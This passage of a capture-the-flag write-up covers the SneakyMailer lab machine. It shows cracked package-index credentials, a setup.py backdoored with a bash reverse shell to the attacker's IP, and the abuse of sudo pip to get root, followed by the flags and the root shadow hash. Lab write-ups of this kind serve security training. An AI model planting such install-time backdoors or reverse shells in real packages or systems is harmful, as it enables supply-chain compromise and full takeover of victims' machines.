class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>To use this server with easy_install, run the following command:</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">    easy_install --index-url http://pypi.sneakycorp.htb/simple/ PACKAGE [PACKAGE2...]</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>The complete list of all packages can be found <a href="http://pypi.sneakycorp.htb:8080/packages/" target="_blank" rel="noopener noreferrer">here</a> or via the <a href="http://pypi.sneakycorp.htb:8080/simple/" target="_blank" rel="noopener noreferrer">simple</a> index.</p><p>This instance is running version 1.3.2 of the <a href="https://pypi.org/project/pypiserver/" target="_blank" rel="noopener noreferrer">pypiserver</a> software.</p></blockquote><p>We can connect to the package index () basic auth
with the cracked credentials <code>pypi</code> / <code>soufianeelhaoui</code>.</p><p>But no package is indexed yet.</p><p>RTFM. Letr&#x27;s read the <a href="https://pypi.org/project/pypiserver/#uploading-packages-remotely" target="_blank" rel="noopener noreferrer">Uploading Packages Remotely</a> page
of pypiserver documentation.</p><p>The first thing we will need to upload a package is <code>~/.pypirc</code>.</p><div class="language-ini codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-ini codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">[distutils]</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">index-servers = local</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">[local]</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">repository: http://pypi.sneakycorp.htb:8080/</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">username: pypi</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">password: soufianeelhaoui</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>And of course we will need <code>setup.py</code> for setuptools.</p><p>Let&#x27;s look at the <a href="https://python-packaging.readthedocs.io/en/latest/minimal.html" target="_blank" rel="noopener noreferrer">Minimal Structure</a> required:</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">cyfun/</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    cyfun/</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        __init__.py</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    setup.py</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p><code>setup.py</code></p><div class="language-python codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-python codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">from</span><span class="token plain"> setuptools </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">import</span><span class="token plain"> setup</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">setup</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token plain">name</span><span class="token operator">=</span><span class="token string" style="color:rgb(255, 121, 198)">&#x27;cyfun&#x27;</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">      version</span><span class="token operator">=</span><span class="token string" style="color:rgb(255, 121, 198)">&#x27;0.1&#x27;</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">      description</span><span class="token operator">=</span><span class="token string" style="color:rgb(255, 121, 198)">&#x27;cyfun de mon pwnage&#x27;</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">      url</span><span class="token operator">=</span><span class="token string" style="color:rgb(255, 121, 198)">&#x27;https://pwn.by/cyfun&#x27;</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">      author</span><span class="token operator">=</span><span class="token string" style="color:rgb(255, 121, 198)">&#x27;cyfun&#x27;</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">      author_email</span><span class="token operator">=</span><span class="token string" style="color:rgb(255, 121, 198)">&#x27;cyfun@example.com&#x27;</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">      license</span><span class="token operator">=</span><span class="token string" style="color:rgb(255, 121, 198)">&#x27;MIT&#x27;</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">      packages</span><span class="token operator">=</span><span class="token punctuation" style="color:rgb(248, 248, 242)">[</span><span class="token string" style="color:rgb(255, 121, 198)">&#x27;cyfun&#x27;</span><span class="token punctuation" style="color:rgb(248, 248, 242)">]</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">      zip_safe</span><span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>Let&#x27;s run <code>python setup.py sdist upload -r local</code> to package it and upload
it.</p><p>Then we can see the package cyfun indexed and removed a few seconds later.
Let&#x27;s add a backdoor in the package.</p><div class="language-python codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-python codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">from</span><span class="token plain"> setuptools </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">import</span><span class="token plain"> setup</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">import</span><span class="token plain"> os</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">os</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">system</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token string" style="color:rgb(255, 121, 198)">&quot;echo &#x27;bash -i &gt;&amp;/dev/tcp/10.10.14.174/8080 0&gt;&amp;1&#x27; | /bin/bash&quot;</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">setup</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token plain">name</span><span class="token operator">=</span><span class="token string" style="color:rgb(255, 121, 198)">&#x27;cyfun&#x27;</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">      version</span><span class="token operator">=</span><span class="token string" style="color:rgb(255, 121, 198)">&#x27;0.1&#x27;</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">      description</span><span class="token operator">=</span><span class="token string" style="color:rgb(255, 121, 198)">&#x27;cyfun de mon pwnage&#x27;</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">      url</span><span class="token operator">=</span><span class="token string" style="color:rgb(255, 121, 198)">&#x27;https://pwn.by/cyfun&#x27;</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">      author</span><span class="token operator">=</span><span class="token string" style="color:rgb(255, 121, 198)">&#x27;cyfun&#x27;</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">      author_email</span><span class="token operator">=</span><span class="token string" style="color:rgb(255, 121, 198)">&#x27;cyfun@example.com&#x27;</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">      license</span><span class="token operator">=</span><span class="token string" style="color:rgb(255, 121, 198)">&#x27;MIT&#x27;</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">      packages</span><span class="token operator">=</span><span class="token punctuation" style="color:rgb(248, 248, 242)">[</span><span class="token string" style="color:rgb(255, 121, 198)">&#x27;cyfun&#x27;</span><span class="token punctuation" style="color:rgb(248, 248, 242)">]</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">      zip_safe</span><span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>Here we got a shell as low:</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">$ low@sneakymailer:~$ id</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">uid=1000(low) gid=1000(low) groups=1000(low),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),109(netdev)</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">,111(bluetooth),119(pypi-pkg)</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">low@sneakymailer:~$ cat user.txt</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">70ac4f2e6be3aece2eed49ecb6f80d7d</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><h2 class="anchor anchorWithStickyNavbar_LWe7" id="privilege-escalation-of-machine--from-low-to-root">Privilege Escalation of Machine : from low to root<a href="#privilege-escalation-of-machine--from-low-to-root" class="hash-link" aria-label="Direct link to Privilege Escalation of Machine : from low to root" title="Direct link to Privilege Escalation of Machine : from low to root">​</a></h2><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">$ printf %s &#x27;ssh-rsa &lt;pubkey&gt; cyfun@penarch&#x27; &gt;&gt; ~/.ssh/authorized_keys</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">$ ssh -i ~/.ssh/id_rsa low@10.10.10.197</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>Let&#x27;s look for low hanging fruits:</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">low@sneakymailer:~$ sudo -l</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">sudo: unable to resolve host sneakymailer: Temporary failure in name resolution</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Matching Defaults entries for low on sneakymailer:</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">User low may run the following commands on sneakymailer:</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    (root) NOPASSWD: /usr/bin/pip</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>Let&#x27;s create a very minimal backdoored package:</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">low@sneakymailer:~$ mktemp -d</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">/tmp/tmp.lIuPOXEbwZ</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">low@sneakymailer:~$ cd /tmp/tmp.lIuPOXEbwZ</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">low@sneakymailer:/tmp/tmp.lIuPOXEbwZ$ vim.tiny setup.py</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">low@sneakymailer:/tmp/tmp.lIuPOXEbwZ$ sudo /usr/bin/pip3 install </span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p><code>setup.py</code></p><div class="language-python codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-python codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">import</span><span class="token plain"> os</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">os</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">system</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token string" style="color:rgb(255, 121, 198)">&quot;echo &#x27;bash -i &gt;&amp;/dev/tcp/10.10.14.174/8080 0&gt;&amp;1&#x27; | /bin/bash&quot;</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>When executed we retrieve the root shell:</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">root@sneakymailer:/tmp/pip-req-build-lp_bvi48# id</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">uid=0(root) gid=0(root) groups=0(root)</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">root@sneakymailer:/tmp/pip-req-build-lp_bvi48# cd</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">root@sneakymailer:~# cat root.txt</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">602b7d042c33e19fdf079cfef493eb60</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">root@sneakymailer:~# cat /etc/shadow | grep root</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">root:$6$jJW2Iy0Knfw7c6gr$/p2MAEhr7Fy4bMIT8szzgnSkL2kp8EaPKvGQ//cfcX0bMnazYHzNwWIsGaGwgceFyftI2Xihj0rrhUbfkrzhf.:18402:0:99999:7:::</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div></div><footer class="theme-doc-footer docusaurus-mt-lg"><div class="theme-doc-footer-tags-row row margin-bottom--sm"><div class="col"><b>Tags:</b><ul class="tags_jXut padding--none margin-left--sm"><li class="tag_QGVx"><a class="tag_zVej tagRegular_sFm0" href="/writeups/tags/security/">security</a></li><li class="tag_QGVx"><a class="tag_zVej tagRegular_sFm0" href="/writeups/tags/writeups/">writeups</a></li><li class="tag_QGVx"><a class="tag_zVej tagRegular_sFm0" href="/writeups/tags/linux/">linux</a></li><li class="tag_QGVx"><a class="tag_zVej tagRegular_sFm0" href="/writeups/tags/pe/">pe</a></li><li class="tag_QGVx"><a class="tag_zVej tagRegular_sFm0" href="/writeups/tags/smtp/">smtp</a></li><li class="tag_QGVx"><a class="tag_zVej tagRegular_sFm0" href="/writeups/tags/imap/">imap</a></li><li class="tag_QGVx"><a class="tag_zVej tagRegular_sFm0" href="/writeups/tags/ftp/">ftp</a></li><li class="tag_QGVx"><a class="tag_zVej tagRegular_sFm0" href="/writeups/tags/python/">python</a></li><li class="tag_QGVx"><a class="tag_zVej tagRegular_sFm0" href="/writeups/tags/htb/">htb</a></li></ul></div></div></footer></article><nav class="pagination-nav docusaurus-mt-lg" aria-label="Docs pages"><a class="pagination-nav__link pagination-nav__link--prev" href="/writeups/HackTheBox/ServMon/write-up/"><div class="pagination-nav__sublabel">Previous</div><div class="pagination-nav__label">ServMon </div></a><a class="pagination-nav__link pagination-nav__link--next" href="/writeups/HackTheBox/Tabby/write-up/"><div class="pagination-nav__sublabel">Next</div><div class="pagination-nav__label">Tabby </div></a></nav></div></div><div class="col col--3"><div class="tableOfContents_bqdL thin-scrollbar theme-doc-toc-desktop"><ul class="table-of-contents table-of-contents__left-border"><li><a href="#overview" class="table-of-contents__link toc-highlight">Overview</a></li><li><a href="#network-enumeration" class="table-of-contents__link toc-highlight">Network enumeration</a></li><li><a href="#http-enumeration" class="table-of-contents__link toc-highlight">HTTP enumeration</a></li><li><a href="#service-discovery" class="table-of-contents__link toc-highlight">Service discovery</a></li><li><a href="#smtp--imap-exploitation" class="table-of-contents__link toc-highlight">SMTP &amp; IMAP exploitation</a></li><li><a href="#ftp-access" class="table-of-contents__link toc-highlight">FTP access</a></li><li><a href="#privilege-escalation-of-machine--from-www-data-to-developer" class="table-of-contents__link toc-highlight">Privilege Escalation of Machine : from www-data to developer</a></li><li><a href="#privilege-escalation-of-machine--from-developer-to-low" class="table-of-contents__link toc-highlight">Privilege Escalation of Machine : from developer to low</a></li><li><a href="#privilege-escalation-of-machine--from-low-to-root" class="table-of-contents__link toc-highlight">Privilege Escalation of Machine : from low to root</a></li></ul></div></div></div></div></main></div></div><footer class="footer"><div class="container container-fluid"><div class="row footer__links"><div class="col footer__col"><div class="footer__title">Support me</div><ul class="footer__items clean-list"><li class="footer__item"><a href="https://github.com/sponsors/S4CH" target="_blank" rel="noopener noreferrer" class="footer__link-item">Github<svg width="13.5" height="13.5" aria-hidden="true" viewBox="0 0 24 24" class="iconExternalLink_nPIU"><path fill="currentColor" d="M21 13v10h-21v-19h12v2h-10v15h17v-8h2zm3-12h-10.988l4.035 4-6.977 7.07 2.828 2.828 6.977-7.07 4.125 4.172v-11z"></path></svg></a></li></ul></div></div><div class="footer__bottom text--center"><div class="footer__copyright">Made with   ♥  by CyFun © 2023 
                            | Built on Docusaurus</div></div></div></footer></div>
<script src="/assets/js/runtime~main.3415e7ae.js"></script>
<script src="/assets/js/main.c90fa39a.js"></script>
</body>
</html>